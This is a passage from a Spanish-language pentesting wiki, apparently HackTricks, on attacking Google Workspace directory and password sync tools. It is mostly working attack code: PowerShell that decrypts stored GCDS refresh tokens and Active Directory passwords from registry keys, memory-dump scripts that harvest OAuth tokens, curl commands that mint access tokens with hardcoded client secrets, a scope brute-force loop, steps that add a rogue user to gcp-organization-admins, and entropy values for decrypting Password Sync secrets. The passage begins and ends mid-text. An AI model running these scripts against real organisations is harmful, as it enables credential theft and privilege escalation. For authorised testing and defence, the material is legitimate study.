https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

Algunos ejemplos utilizando algunos de esos alcances:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** es un complemento para Google Workspace que proporciona herramientas para la retenci칩n de datos, b칰squeda y exportaci칩n de los datos de su organizaci칩n almacenados en los servicios de Google Workspace como Gmail, Drive, Chat y m치s.

* Un **Asunto** en Google Workspace Vault es un **contenedor** que organiza y agrupa toda la informaci칩n relacionada con un caso espec칤fico, investigaci칩n o asunto legal. Sirve como el centro principal para gestionar **Retenciones**, **B칰squedas** y **Exportaciones** relacionadas con ese tema en particular.
* Una **Retenci칩n** en Google Workspace Vault es una **acci칩n de preservaci칩n** aplicada a usuarios o grupos espec칤ficos para **prevenir la eliminaci칩n o alteraci칩n** de sus datos dentro de los servicios de Google Workspace. Las retenciones aseguran que la informaci칩n relevante permanezca intacta y sin modificar durante la duraci칩n de un caso legal o investigaci칩n.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
M치s [puntos finales de API en la documentaci칩n](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

Esta es una herramienta que se puede utilizar para **sincronizar tus usuarios y grupos de Active Directory con tu Workspace** (y no al rev칠s en el momento de escribir esto).

Es interesante porque es una herramienta que requerir치 las **credenciales de un superusuario de Workspace y un usuario privilegiado de AD**. Por lo tanto, podr칤a ser posible encontrarla dentro de un servidor de dominio que est칠 sincronizando usuarios de vez en cuando.

{% hint style="info" %}
Para realizar un **MitM** al binario **`config-manager.exe`** solo agrega la siguiente l칤nea en el archivo `config.manager.vmoptions`: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
Ten en cuenta que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) es capaz de detectar **GCDS**, obtener informaci칩n sobre la configuraci칩n y **incluso las contrase침as y credenciales encriptadas**.
{% endhint %}

Tambi칠n ten en cuenta que GCDS no sincronizar치 contrase침as de AD a Workspace. Si acaso, solo generar치 contrase침as aleatorias para los usuarios reci칠n creados en Workspace, como puedes ver en la siguiente imagen:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Tokens de Disco y Credenciales de AD

El binario `config-manager.exe` (el binario principal de GCDS con GUI) almacenar치 las credenciales de Active Directory configuradas, el token de actualizaci칩n y el acceso por defecto en un **archivo xml** en la carpeta **`C:\Program Files\Google Cloud Directory Sync`** en un archivo llamado **`Untitled-1.xml`** por defecto. Aunque tambi칠n podr칤a guardarse en los `Documentos` del usuario o en **cualquier otra carpeta**.

Adem치s, el registro **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** dentro de la clave **`open.recent`** contiene las rutas a todos los archivos de configuraci칩n abiertos recientemente (xmls). As칤 que es posible **verificarlo para encontrarlos**.

La informaci칩n m치s interesante dentro del archivo ser칤a:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
Nota c칩mo el **refresh** **token** y la **contrase침a** del usuario est치n **encriptados** usando **AES CBC** con una clave y un IV generados aleatoriamente almacenados en **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** (donde sea que la biblioteca Java **`prefs`** almacene las preferencias) en las claves de cadena **`/Encryption/Policy/V2.iv`** y **`/Encryption/Policy/V2.key`** almacenadas en base64.

<details>

<summary>Script de Powershell para desencriptar el refresh token y la contrase침a</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
Tenga en cuenta que es posible verificar esta informaci칩n revisando el c칩digo java de **`DirSync.jar`** en **`C:\Program Files\Google Cloud Directory Sync`** buscando la cadena `exportkeys` (ya que ese es el par치metro cli que el binario `upgrade-config.exe` espera para volcar las claves).
{% endhint %}

En lugar de usar el script de powershell, tambi칠n es posible usar el binario **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** con el par치metro `-exportKeys` y obtener la **Key** y **IV** del registro en hex y luego simplemente usar alg칰n cyberchef con AES/CBC y esa clave e IV para descifrar la informaci칩n.

### GCDS - Volcando tokens de la memoria

Al igual que con GCPW, es posible volcar la memoria del proceso del `config-manager.exe` (es el nombre del binario principal de GCDS con GUI) y podr치s encontrar tokens de actualizaci칩n y de acceso (si ya han sido generados).\
Supongo que tambi칠n podr칤as encontrar las credenciales configuradas de AD.

<details>

<summary>Volcar procesos config-manager.exe y buscar tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - Generaci칩n de tokens de acceso a partir de tokens de actualizaci칩n

Usando el token de actualizaci칩n, es posible generar tokens de acceso utilizando este y el ID de cliente y el secreto de cliente especificados en el siguiente comando:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
Tenga en cuenta que incluso teniendo un token de actualizaci칩n, no es posible solicitar ning칰n alcance para el token de acceso, ya que solo puede solicitar los **alcances admitidos por la aplicaci칩n donde est치 generando el token de acceso**.

Adem치s, el token de actualizaci칩n no es v치lido en todas las aplicaciones.
{% endhint %}

Por defecto, GCSD no tendr치 acceso como el usuario a todos los posibles alcances de OAuth, por lo que utilizando el siguiente script podemos encontrar los alcances que se pueden usar con el `refresh_token` para generar un `access_token`:

<details>

<summary>Script Bash para fuerza bruta de alcances</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Y este es el resultado que obtuve en el momento de la escritura:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### Crear un usuario y agregarlo al grupo `gcp-organization-admins` para intentar escalar en GCP
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
No es posible otorgar al nuevo usuario el rol de Super Admin porque el **token de actualizaci칩n no tiene suficientes alcances** para otorgar los privilegios requeridos.
{% endhint %}

## Sincronizaci칩n del Directorio de Administradores

La principal diferencia entre esta forma de sincronizar usuarios con GCDS es que GCDS se realiza manualmente con algunos binarios que necesitas descargar y ejecutar, mientras que **la Sincronizaci칩n del Directorio de Administradores es sin servidor** y est치 gestionada por Google en [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

En el momento de escribir esto, este servicio est치 en beta y admite 2 tipos de sincronizaci칩n: Desde **Active Directory** y desde **Azure Entra ID:**

* **Active Directory:** Para configurar esto, necesitas dar **acceso a Google a tu entorno de Active Directory**. Y como Google solo tiene acceso a redes de GCP (a trav칠s de **conectores VPC**), necesitas crear un conector y luego hacer que tu AD est칠 disponible desde ese conector al tenerlo en VMs en la red de GCP o usando Cloud VPN o Cloud Interconnect. Luego, tambi칠n necesitas proporcionar **credenciales** de una cuenta con acceso de lectura sobre el directorio y un **certificado** para contactar a trav칠s de **LDAPS**.
* **Azure Entra ID:** Para configurar esto, solo es necesario **iniciar sesi칩n en Azure con un usuario con acceso de lectura** sobre la suscripci칩n de Entra ID en un pop-up mostrado por Google, y Google mantendr치 el token con acceso de lectura sobre Entra ID.

Una vez configuradas correctamente, ambas opciones permitir치n **sincronizar usuarios y grupos a Workspace**, pero no permitir치n configurar usuarios y grupos desde Workspace a AD o EntraID.

Otras opciones que permitir치 durante esta sincronizaci칩n son:

* Enviar un correo electr칩nico a los nuevos usuarios para iniciar sesi칩n
* Cambiar autom치ticamente su direcci칩n de correo electr칩nico a la utilizada por Workspace. As칤 que si Workspace est치 usando `@hacktricks.xyz` y los usuarios de EntraID usan `@carloshacktricks.onmicrosoft.com`, se utilizar치 `@hacktricks.xyz` para los usuarios creados en la cuenta.
* Seleccionar los **grupos que contienen los usuarios** que ser치n sincronizados.
* Seleccionar **grupos** para sincronizar y crear en Workspace (o indicar sincronizar todos los grupos).

### Desde AD/EntraID -> Google Workspace (& GCP)

Si logras comprometer un AD o EntraID tendr치s control total de los usuarios y grupos que se van a sincronizar con Google Workspace.\
Sin embargo, ten en cuenta que las **contrase침as** que los usuarios podr칤an estar usando en Workspace **podr칤an ser las mismas o no**.

#### Atacando usuarios

Cuando ocurre la sincronizaci칩n, puede sincronizar **todos los usuarios de AD o solo los de una OU espec칤fica** o solo los **usuarios miembros de grupos espec칤ficos en EntraID**. Esto significa que para atacar a un usuario sincronizado (o crear uno nuevo que se sincronice) primero necesitar치s averiguar qu칠 usuarios est치n siendo sincronizados.

* Los usuarios pueden estar **reutilizando la contrase침a o no de AD o EntraID**, pero esto significa que necesitar치s **comprometer las contrase침as de los usuarios para iniciar sesi칩n**.
* Si tienes acceso a los **correos** de los usuarios, podr칤as **cambiar la contrase침a de Workspace de un usuario existente**, o **crear un nuevo usuario**, esperar hasta que se sincronice y configurar la cuenta.

Una vez que accedas al usuario dentro de Workspace, se le pueden otorgar algunos **permisos por defecto**.

#### Atacando Grupos

Tambi칠n necesitas averiguar primero qu칠 grupos est치n siendo sincronizados. Aunque existe la posibilidad de que **TODOS** los grupos est칠n siendo sincronizados (ya que Workspace permite esto).

{% hint style="info" %}
Ten en cuenta que incluso si los grupos y membres칤as se importan a Workspace, los **usuarios que no est치n sincronizados en la sincronizaci칩n de usuarios no ser치n creados** durante la sincronizaci칩n de grupos, incluso si son miembros de alguno de los grupos sincronizados.
{% endhint %}

Si sabes qu칠 grupos de Azure est치n siendo **asignados permisos en Workspace o GCP**, podr칤as simplemente agregar un usuario comprometido (o reci칠n creado) en ese grupo y obtener esos permisos.

Hay otra opci칩n para abusar de grupos privilegiados existentes en Workspace. Por ejemplo, el grupo `gcp-organization-admins@<workspace.email>` generalmente tiene altos privilegios sobre GCP.

Si la sincronizaci칩n de, por ejemplo, EntraID a Workspace est치 **configurada para reemplazar el dominio** del objeto importado **con el correo de Workspace**, ser치 posible para un atacante crear el grupo `gcp-organization-admins@<entraid.email>` en EntraID, agregar un usuario en este grupo y esperar hasta que ocurra la sincronizaci칩n de todos los grupos.\
**El usuario ser치 agregado en el grupo `gcp-organization-admins@<workspace.email>` escalando privilegios en GCP.**

### Desde Google Workspace -> AD/EntraID

Ten en cuenta que Workspace requiere credenciales con acceso de solo lectura sobre AD o EntraID para sincronizar usuarios y grupos. Por lo tanto, no es posible abusar de Google Workspace para realizar ning칰n cambio en AD o EntraID. As칤 que **esto no es posible** en este momento.

Tampoco s칠 d칩nde almacena Google las credenciales de AD o el token de EntraID y no **puedes recuperarlas reconfigurando la sincronizaci칩n** (no aparecen en el formulario web, necesitas darlas nuevamente). Sin embargo, desde la web podr칤a ser posible abusar de la funcionalidad actual para **listar usuarios y grupos**.

## GPS - Sincronizaci칩n de Contrase침as de Google

Este es el binario y servicio que Google ofrece para **mantener sincronizadas las contrase침as de los usuarios entre el AD** y Workspace. Cada vez que un usuario cambia su contrase침a en el AD, se establece en Google.

Se instala en `C:\Program Files\Google\Password Sync` donde puedes encontrar el binario `PasswordSync.exe` para configurarlo y `password_sync_service.exe` (el servicio que seguir치 ejecut치ndose).

### GPS - Configuraci칩n

Para configurar este binario (y servicio), es necesario **darle acceso a un principal de Super Admin en Workspace**:

* Iniciar sesi칩n a trav칠s de **OAuth** con Google y luego **almacenar치 un token en el registro (encriptado)**
* Solo disponible en Controladores de Dominio con GUI
* Proporcionar algunas **credenciales de Cuenta de Servicio de GCP** (archivo json) con permisos para **gestionar los usuarios de Workspace**
* Muy mala idea ya que esas credenciales nunca expiran y podr칤an ser mal utilizadas
* Muy mala idea dar acceso a una SA sobre workspace ya que la SA podr칤a ser comprometida en GCP y ser칤a posible pivotar a Workspace
* Google lo requiere para controladores de dominio sin GUI
* Estas credenciales tambi칠n se almacenan en el registro

Respecto a AD, es posible indicar que use el **contexto de aplicaciones actual, an칩nimo o algunas credenciales espec칤ficas**. Si se selecciona la opci칩n de credenciales, el **nombre de usuario** se almacena dentro de un archivo en el **disco** y la **contrase침a** est치 **encriptada** y almacenada en el **registro**.

### GPS - Extracci칩n de contrase침a y token del disco

{% hint style="success" %}
Ten en cuenta que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) es capaz de detectar **GPS**, obtener informaci칩n sobre la configuraci칩n y **incluso desencriptar la contrase침a y el token**.
{% endhint %}

En el archivo **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** es posible encontrar parte de la configuraci칩n como el **`baseDN`** del AD configurado y el **`username`** cuyas credenciales est치n siendo utilizadas.

En el registro **`HKLM\Software\Google\Google Apps Password Sync`** es posible encontrar el **token de actualizaci칩n encriptado** y la **contrase침a encriptada** para el usuario de AD (si la hay). Adem치s, si en lugar de un token, se utilizan algunas **credenciales de SA**, tambi칠n es posible encontrar esas encriptadas en esa direcci칩n del registro. Los **valores** dentro de este registro son solo **accesibles** por **Administradores**.

La **contrase침a** encriptada (si la hay) est치 dentro de la clave **`ADPassword`** y est치 encriptada usando la API **`CryptProtectData`**. Para desencriptarla, necesitas ser el mismo usuario que configur칩 la sincronizaci칩n de contrase침as y usar esta **entrop칤a** al usar **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

El token encriptado (si lo hay) est치 dentro de la clave **`AuthToken`** y est치 encriptado usando la API **`CryptProtectData`**. Para desencriptarlo, necesitas ser el mismo usuario que configur칩 la sincronizaci칩n de contrase침as y usar esta **entrop칤a** al usar **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Adem치s, tambi칠n est치 codificado usando base32hex con el diccionario **`0123456789abcdefghijklmnopqrstv`**.

Los valores de entrop칤a se encontraron utilizando la herramienta. Se configur칩 para monitorear las llamadas a **`CryptUnprotectData`** y **`CryptProtectData`** y luego se utiliz칩 la herramienta para lanzar y monitorear `PasswordSync.exe`, que desencriptar치 la contrase침a y el token de autenticaci칩n configurados al principio y la herramienta **mostrar치 los valores de la entrop칤a utilizada** en ambos casos:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Ten en cuenta que tambi칠n es posible ver los valores **desencriptados** en la entrada o salida de las llamadas a estas APIs tambi칠n (en caso de que en alg칰n momento Winpeas deje de funcionar).

En caso de que la Sincronizaci칩n de Contrase침as se haya **configurado con credenciales de SA**, tambi칠n se almacenar치 en claves dentro del registro **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Extracci칩n de tokens de la memoria

Al igual que con GCPW, es posible extraer la memoria del proceso de `PasswordSync.exe` y los procesos `password_sync_service.exe` y podr치s encontrar tokens de actualizaci칩n y acceso (si ya han sido generados).\
Supongo que tambi칠n podr칤as encontrar las credenciales configuradas de AD.

<details>

<summary>Extraer <code>PasswordSync.exe</code> y los procesos <code>password_sync_service.exe</code> y buscar tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
